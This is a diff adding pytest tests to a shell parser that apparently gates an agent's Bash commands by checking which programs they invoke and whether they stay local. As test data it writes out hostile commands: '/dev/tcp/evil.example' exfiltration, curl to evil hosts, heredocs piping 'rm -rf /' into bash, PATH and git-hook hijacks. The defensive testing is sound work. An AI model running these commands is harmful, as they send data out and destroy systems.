@@ -3334,3 +3334,202 @@ class TestLiveBlocklistBypasses:
         from framework.authority.policy_engine import UNRESOLVED
         assert UNRESOLVED in extract_invoked_binaries("ls && bash /tmp/exfil.sh")
         assert UNRESOLVED not in extract_invoked_binaries("bash -c 'sudo ls'")
+
+
+# ---------------------------------------------------------------------------
+# The command word must BE a command — measured defect, 2026-07-27
+# ---------------------------------------------------------------------------
+#
+# A dry run replayed the authority matrix over 39,797 real recorded Bash
+# commands. 347 DISTINCT tokens that are not programs at all were being
+# resolved as the command word — bare `1`, `)`, `#`, `.`,
+# `REDIS_HOST:-localhost`, and whole sentences lifted out of heredoc bodies —
+# and the neighbouring "only real binaries" bucket was optimistic for the same
+# reason (its 609 tokens included `A`, `ACK`, `ALLOW`, `AND`, `API`). Each
+# class below is one root cause, with the shape that produced it in the real
+# corpus. Every arm here FAILS against the pre-change parser.
+
+class TestCommandWordIsAProgram:
+    """Root cause -> the token it manufactured. One arm each."""
+
+    def test_redirect_ampersand_is_not_a_separator(self):
+        """`2>&1` — `&` was a statement separator even inside a redirection
+        operator, so `2>` and `1` became separate statements and the DIGIT `1`
+        became a command word. Largest single cause: 14,943 records."""
+        bins = extract_invoked_binaries("redis-cli ping 2>&1 | head -1")
+        assert "1" not in bins
+        assert set(bins) == {"redis-cli", "head"}
+        for cmd in ("ls >&2", "ls &>/dev/null", "ls 2>&1", "ls |& cat"):
+            assert "1" not in extract_invoked_binaries(cmd)
+            assert "2" not in extract_invoked_binaries(cmd)
+
+    def test_parameter_expansion_is_not_a_brace_group(self):
+        """`${REDIS_HOST:-localhost}` — `{`/`}` were unconditional statement
+        boundaries, so the parameter name plus its default became a command
+        word in 602 records."""
+        bins = extract_invoked_binaries('redis-cli -h "${REDIS_HOST:-localhost}" ping')
+        assert bins == ["redis-cli"]
+        assert "REDIS_HOST:-localhost" not in extract_invoked_binaries(
+            'echo "${REDIS_HOST:-localhost}"')
+
+    def test_double_quote_scanner_understands_nesting(self):
+        """`"a $(f "$b") c"` is ONE word to bash. Ending the span at the inner
+        quote desynchronised everything after it, manufacturing ` -p $`,
+        `null | head -1)` and `) :: $(grep …)` out of a redis-cli call."""
+        cmd = ('echo "T=$(redis-cli -h "${REDIS_HOST:-localhost}" '
+               '-p "${REDIS_PORT:-6379}" XLEN k 2>/dev/null | head -1)"')
+        assert set(extract_invoked_binaries(cmd)) == {"echo", "redis-cli", "head"}
+
+    def test_comments_are_not_statements(self):
+        """shlex does not strip comments and neither did the splitter, so every
+        commented line became a statement whose first word was a `binary`."""
+        bins = extract_invoked_binaries("ls -la\n# deliver the scrum (lag=1)\necho hi")
+        assert bins == ["ls", "echo"]
+        assert "#" not in extract_invoked_binaries("ls\n## heading\n### deeper")
+
+    def test_a_hash_inside_a_word_is_not_a_comment(self):
+        """Anti-vacuity for the arm above: stripping too much would hide a
+        real command."""
+        assert "curl" in extract_invoked_binaries("curl https://x/page#frag")
+        assert "echo" in extract_invoked_binaries('echo "${v#prefix}"')
+
+    def test_heredoc_body_for_a_data_consumer_is_data(self):
+        """`cat >> notes.md <<'EOF'` fed MARKDOWN to the shell parser, so `##`
+        and whole sentences became command words."""
+        cmd = "cat >> notes.md <<'EOF'\n## full authority\n- a bullet\nEOF"
+        assert extract_invoked_binaries(cmd) == ["cat"]
+
+    def test_heredoc_body_for_an_interpreter_is_not_shell(self):
+        cmd = "python3.12 <<'PY'\nimport json\nprint(json.load(f).get('x'))\nPY"
+        assert extract_invoked_binaries(cmd) == ["python3.12"]
+
+    def test_arithmetic_expansion_invokes_nothing(self):
+        """`$((NOW-START))` yielded the command `(NOW-START)`."""
+        assert extract_invoked_binaries("echo $((NOW-START))") == ["echo"]
+        assert "i++" not in extract_invoked_binaries("(( i++ ))\necho done")
+
+    def test_find_exec_placeholder_is_not_a_brace_group(self):
+        r"""`find . -exec cat {} \;` split at `{}`, leaving `\;` alone to
+        reduce to the command `;`."""
+        bins = extract_invoked_binaries(r"find . -name x -exec cat {} \; | head -30")
+        assert ";" not in bins
+        assert set(bins) == {"find", "head"}
+
+    def test_case_patterns_are_not_commands(self):
+        """`polads-ceo)` is a PATTERN; bash never executes it. The subject of
+        `case "$x" in` is not a command either."""
+        cmd = 'case "$x" in\n  polads-ceo) echo one;;\n  *) echo other;;\nesac'
+        assert set(extract_invoked_binaries(cmd)) == {"echo"}
+        assert "$x" not in extract_invoked_binaries(cmd)
+
+    def test_loop_variable_is_not_a_command(self):
+        """`for d in a b c` names a loop VARIABLE; `d`, `f`, `x`, `p`, `i` and
+        `o` were all being counted as programs."""
+        assert extract_invoked_binaries(
+            "for d in draft-reply ledger; do echo $d; done") == ["echo"]
+
+    def test_command_substitution_text_does_not_leak_into_its_container(self):
+        """`MF=$(find ~/vault/3-People -name x)` resolved the command word
+        `3-People`, because the substitution's TEXT stayed in the enclosing
+        statement and shlex split on the spaces inside it."""
+        from framework.authority.policy_engine import ENV_ASSIGNMENT
+        bins = extract_invoked_binaries(
+            "MF=$(find ~/vault/3-People -name 'conversations.md' | head -1)")
+        assert "3-People" not in bins
+        assert set(bins) == {ENV_ASSIGNMENT, "find", "head"}
+
+    def test_unexpanded_variable_command_word_is_unresolved(self):
+        """`$PY -m pytest` reported the BINARY `$PY`. The parser cannot know
+        what it expands to, and must say so rather than invent a name."""
+        from framework.authority.policy_engine import UNRESOLVED
+        bins = extract_invoked_binaries("PY=/usr/bin/python3.12\n$PY -m pytest")
+        assert "$PY" not in bins
+        assert UNRESOLVED in bins
+
+    @pytest.mark.parametrize("word", [
+        "1", "2", ")", "(", "#", "##", "###", ".get", "---", "*", "->", ",d",
+        "$PY", "$f", "((", "REDIS_HOST:-localhost", "[0]", "d[0][id]", "%s",
+        "3.", "+", "feat(hatch):", "", "—",
+    ])
+    def test_non_program_words_are_rejected(self, word):
+        from framework.authority.policy_engine import _is_program_word
+        assert not _is_program_word(word)
+
+    @pytest.mark.parametrize("word", [
+        "ls", "git", "python3.12", "redis-cli", "send-to-group.sh", "7z",
+        "_helper", "gh", ".", ":", "[", "[[", "!",
+    ])
+    def test_real_program_words_are_accepted(self, word):
+        """Anti-vacuity: the guard must not swallow real names, including the
+        punctuation command words `.` (dot-source) and `[` (test)."""
+        from framework.authority.policy_engine import _is_program_word
+        assert _is_program_word(word)
+
+
+class TestParserFixDoesNotWiden:
+    """The safety property is DIRECTIONAL: fewer things unresolvable, never an
+    unresolvable thing made to look safe. A heredoc body is treated as data
+    only when a program that cannot execute it as shell reads it."""
+
+    def test_heredoc_piped_into_a_shell_is_still_scanned(self):
+        """`cat <<EOF | bash` — asking only about the command word `cat`
+        answers `data` for a body that really is executed."""
+        assert "sendmail" in extract_invoked_binaries(
+            "cat <<EOF | bash\nsendmail -t evil@example.com\nEOF")
+        assert is_destructive_rm("cat <<EOF | sh\nrm -rf /\nEOF")
+
+    def test_heredoc_through_sudo_is_still_scanned(self):
+        assert is_destructive_rm("sudo bash <<'EOF'\nrm -rf /\nEOF")
+        assert "sudo" in extract_invoked_binaries("bash <<'EOF'\nsudo rm -rf /\nEOF")
+
+    def test_heredoc_to_an_unknown_owner_is_still_scanned(self):
+        """Fail closed: an owner the data-consumer set does not name keeps its
+        body analysed as shell."""
+        assert "sendmail" in extract_invoked_binaries(
+            "ssh host <<'EOF'\nsendmail -t\nEOF")
+        assert "curl" in extract_invoked_binaries(
+            "somewrapper <<'EOF'\ncurl https://evil.example\nEOF")
+
+    def test_substitution_inside_a_parameter_default_is_scanned(self):
+        assert "curl" in extract_invoked_binaries('echo "${X:-$(curl https://evil)}"')
+
+    def test_substitution_inside_double_quotes_is_scanned(self):
+        """The 498 real records this closes: master read `redis-cli`, `gh` and
+        `launchctl` invocations inside `$( )` in a double-quoted string as
+        invisible, and classified the whole command provably-local."""
+        assert "redis-cli" in extract_invoked_binaries(
+            'echo "len: $(redis-cli -h localhost XLEN cabinet:triggers:cos)"')
+        assert "gh" in extract_invoked_binaries(
+            'echo "pr: $(gh pr list --json number)"')
+
+    @pytest.mark.parametrize("cmd", [
+        "sendmail -t a@b.com", "mail -s x a@b.com",
+        "python3 -c 'import smtplib'",
+        'osascript -e \'tell application "Messages" to send "x"\'',
+        "curl -X POST https://hooks.example.com/y",
+        "2>/tmp/echo sendmail -t", "ls && bash /tmp/exfil.sh",
+        "ls\nsendmail -t", "PATH=/tmp/evil ls",
+        "GIT_EXTERNAL_DIFF=/tmp/x git diff",
+        "git -c core.fsmonitor=/tmp/x status",
+        "echo leak > /dev/tcp/evil.example/25",
+        "sudo curl https://x", "echo x | xargs curl", "A=curl; $A https://x",
+        "$'curl' https://x", "perl -e 'system(\"curl x\")'", ". /tmp/push.sh",
+        "cat <<EOF | bash\nsendmail -t\nEOF",
+        'echo "$(sendmail -t)"',
+        "cat <<'EOF' | sh\ncurl https://evil\nEOF",
+    ])
+    def test_egress_corpus_still_fails_the_locality_proof(self, cmd):
+        """Rounds one and two of this parser's hardening, plus the shapes the
+        rewrite could plausibly have re-opened. None may become local."""
+        from framework.authority.classifier import _is_provably_local
+        assert not _is_provably_local(cmd), f"{cmd!r} became provably local"
+
+    @pytest.mark.parametrize("cmd", [
+        "ls -la", "cat f.txt", "grep -n x f", "echo hi 2>&1",
+        "git status --short", "git log --oneline -5",
+        "cat <<'EOF' > /tmp/notes.md\n## heading\nEOF",
+    ])
+    def test_ordinary_local_commands_are_still_local(self, cmd):
+        """Anti-vacuity for the arm above."""
+        from framework.authority.classifier import _is_provably_local
+        assert _is_provably_local(cmd), f"{cmd!r} lost its locality proof"
